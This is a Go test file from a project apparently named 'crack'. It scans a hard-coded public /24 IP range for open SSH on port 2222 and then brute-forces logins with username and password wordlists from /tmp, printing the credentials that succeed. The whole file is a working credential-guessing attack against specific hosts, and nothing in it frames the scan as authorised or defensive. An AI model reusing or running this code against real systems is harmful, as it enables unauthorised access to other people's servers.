package util

import (
	"crack/model"
	"fmt"
	"testing"
	"crack/util"
)

func TestScanSsh(t *testing.T) {

	ipli := make(chan string, 0)
	go func() {

		ip, _ := util.Makeip("103.238.226.1/24")
		for _, i := range ip {
			ipli <- fmt.Sprintf("%s:2222", i)
		}
		close(ipli)
	}()

	re := util.Portcheck(100, ipli)

	userlist, _ := util.Makelist("/tmp/user.txt")
	passlist, _ := util.Makelist("/tmp/pass.txt")

	passchan := make(chan model.ScanResult, 0)

	go makchan(re, userlist, passlist, passchan)

	resutlt := util.Passattack(100, passchan)
	for i := range resutlt {
		if i.Success == true {
			fmt.Println( i)
		}

	}

}

func makchan(re chan model.ServerResult, userlist []string, passlist []string, passchan chan model.ScanResult) {

	for i := range re {
		for _, u := range userlist {
			for _, p := range passlist {
				if i.Open == true {
					passchan <- model.ScanResult{Hostport: i.Hostport, Username: u, Password: p, Server: ScanSsh}
				}
			}
		}
	}
	close(passchan)

}
